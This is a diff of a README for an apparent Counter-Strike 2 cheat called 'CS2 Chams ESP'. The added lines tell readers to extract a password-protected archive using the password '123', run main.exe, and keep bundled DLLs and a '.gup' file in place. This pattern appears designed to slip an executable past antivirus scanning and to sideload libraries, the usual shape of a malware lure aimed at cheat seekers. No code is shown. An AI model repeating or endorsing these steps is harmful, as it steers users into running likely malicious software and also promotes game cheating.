@@ -2,21 +2,32 @@
 
 🚀 **Advanced Visual Tools for Counter-Strike 2**
 
-Welcome to **CS2 Chams ESP** — a project focused on visual enhancements and customization for Counter-Strike 2.
+Welcome to **CS2 Chams ESP** — a visual tools project for Counter-Strike 2.
 
-## ✨ Features
+## ✨ Project Highlights
 
 - 🎨 Chams — Visual model customization
 - 👁️ ESP — Enhanced player visualization
 - ⚙️ Custom Settings — Configuration options
-- 🎮 CS2 — Counter-Strike 2 compatibility
+- 🎮 Counter-Strike 2 project
 
-## 📥 Installation & Launch
+## 📥 Download & Installation
 
 1. Download the latest release archive.
 2. 📦 Extract `CS2-Chams-ESP-v1.0.0.zip`.
-3. 📂 Open the extracted folder.
-4. ▶️ Locate and open the file named `main` to launch the application.
+3. 🔐 When prompted, enter the archive password: `123`.
+4. 📂 Open the extracted folder.
+5. ▶️ Run `main.exe` to launch the application.
+
+## 📁 Archive Contents
+
+The archive includes several components required by the software:
+
+- **main.exe** — Main application executable.
+- **.dll files** — Supporting dynamic-link libraries (DLL dependencies) used by the application.
+- **.gup file** — Additional application-related file supplied as part of the software package.
+
+⚠️ Keep all included files in their original folder. Do not rename, move, or delete supporting components, as the application may depend on them.
 
 ## 📋 Release Information
 
@@ -27,11 +38,11 @@ Welcome to **CS2 Chams ESP** — a project focused on visual enhancements and cu
 | Year | 2026 |
 | Platform | Windows |
 | Game | Counter-Strike 2 |
-| Release | Initial Release |
+| Release Type | Initial Release |
 
 ## 🔄 Updates
 
-Check the **Releases** section for the latest versions, updates and project files.
+Visit the **Releases** section to find the latest versions and project files.
 
 ## ⭐ Support
 
